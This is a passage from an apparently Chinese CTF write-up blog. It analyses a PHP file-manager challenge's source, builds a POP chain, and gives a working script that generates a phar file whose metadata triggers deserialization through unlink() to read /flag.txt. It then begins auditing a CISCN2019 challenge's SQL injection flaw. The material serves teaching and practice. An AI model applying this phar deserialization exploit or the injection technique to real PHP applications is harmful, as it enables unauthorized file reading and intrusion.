class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里最重要的就是<code>class.php</code></p><p>仔细分析一下，我们需要构造这么一条pop链，User &#x3D;&gt; FileList &#x3D;&gt; File</p><p>其实主要是需要调用 File类的close()方法进行文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是怎么调用File类中的close()方法呢，我们可以很容易想到使用User类中的destruct()方法去调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是这是<strong>错误</strong>的，因为这样做没有回显，我们需要使用FileList类做一个跳板：</p><p>FileList类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>当我们把User类的<code>$db</code>设置为FileList对象时，调用析构方法，<code> $this-&gt;db-&gt;close();</code> 由于FileList类没有<code>close()</code>方法，所以会调用其中的 <code>__call()</code> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>       <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>此时 <code>$func</code>就是 <code>close</code>，<code>$args</code>参数为空。这个函数的意思是，把函数名存进<code>$funcs</code>数组中</p><p><code>foreach</code>遍历<code>$files</code>数组，每一个<code>$file</code>就是一个File对象，让每一个File对象去执行 <code>close()</code>方法，把结果给存进二维数组中，再观察一下FileList类析构方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        ...<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        ...<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-comment"># 这里会将前面close方法执行的结果输出</span><br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>           ...<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>然后我们观察一下<code>delete.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br></code></pre></td></tr></table></figure><p>发现会调用File类的delete()方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里使用 <code>unlink()函数</code>删除文件，但是这个函数会触发phar反序列化漏洞：</p><p>这里是一些受影响的函数：</p><p><img src="https://s2.loli.net/2023/03/23/JlVktEbKgiWGAeH.png" alt="img"></p><p>于是我们可以上传一个<code>phar</code>文件，然后点击删除它，触发phar反序列化，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>        <span class="hljs-variable">$file</span>-&gt;filename = <span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br><span class="hljs-variable">$a</span>-&gt;db = <span class="hljs-variable">$b</span>;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>运行代码，生成phar文件，我们上传上去：</p><p><img src="https://s2.loli.net/2023/05/11/pSzyH4nU8f53XC6.png" alt="image-20230511200928289"></p><p>然后我们删除它：记得要将<strong>文件名改为phar伪协议格式</strong>：</p><p><img src="https://s2.loli.net/2023/05/11/NdAhFuWskYbrMD3.png" alt="image-20230511201006907"></p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><img src="https://s2.loli.net/2023/01/15/fWsc1FQLUeGxrpj.png" alt="image-20230115151136787" style="zoom:33%;" /><p>首先打开页面，使用工具扫描一下：</p><p>发现存在 <code>robots.txt</code> 文件：</p><blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>*.php.bak<br></code></pre></td></tr></table></figure></blockquote><p>然后尝试不同的前缀，发现 <code>image.php.bak</code> ，文件下载成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">// 将id,path中的所有 \\0,%00,\\&#x27;,&#x27; 替换为空字符串</span><br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>进入代码审计。</p><blockquote><p><strong>addslashes()</strong> 函数返回在预定义字符之前添加<strong>反斜杠</strong>的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul></blockquote><p>根据分析，如果我们传参 <code>id = \\0 </code> ，那么经过 